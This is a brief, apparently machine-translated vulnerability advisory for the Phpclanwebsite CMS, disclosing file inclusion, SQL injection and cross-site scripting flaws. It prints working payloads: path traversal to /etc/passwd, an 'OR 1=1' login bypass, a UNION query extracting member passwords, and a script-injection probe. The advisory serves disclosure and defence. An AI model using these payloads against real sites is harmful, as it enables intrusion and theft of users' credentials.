The description:
The set vulnerability in CMS Phpclanwebsite versions 1.23.3 Fix Pack #5 and more low was revealed.

1. Multiple File Including Vulnerabilities

Vulnerability exists for the reason that direct access to some files, around logicians of work of the appendix is possible.
It gives the chance to redefine internal variables which are transferred as arguments in function include ().
Examples of vulnerable files:
/theme/superchrome/box.php?boxname=../../../../../etc/passwd%00
/phpclanwebsite/footer.php?theme=../../../../../etc/passwd%00
etc

The note:
For vulnerability operation the following options PHP are required: register_globals=On and magic_quotes_gpc=Off

2. Multiple SQL Injection Vulnerabilities

The appendix everywhere does not check the variables transferred from outside of the user. It allows to carry out any SQL Injection.
Examples of vulnerable files:
SQL Injection (insert) -
 /index.php?page='SQL
SQL Injection (delete) -
 /index.php?page=processforms&amp;ok=1&amp;SP=1&amp;form_id=2
 , where &quot;form_id&quot; the identifier of the deleted user
SQL Injection (select) -
 /index.php?page=login
 POST:pcwlogin='SQL&amp;pcw_pass='SQL

 /index.php?page=login
 POST:pcwlogin=1'+OR+1=1--&amp;pcw_pass=1

SQL Injection (select) -
 /index.php?page=downloads&amp;func=search
 POST:searchvalue='SQL&amp;whichfield=SQL

 /index.php?page=downloads&amp;func=search
 POST:searchvalue=1&amp;whichfield=dl_name&gt;1)+limit+0+union+select+tag,2,3,login,5,6,7,email,9,password,11,12,13,14,15+from+cws_members--
etc

The note:
For operation of all SQL Injection vulnerabilities, except vulnerability in parametre &quot;whichfield&quot;, are required disconnected magic_quotes_gpc.

3. Multiple Cross-site Scripting Vulnerabilities

The appendix everywhere does not check the variables transferred from outside of the user. It allows to carry out any code in a context of a user browser.
Examples of vulnerable files:
/index.php?page='&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;
etc
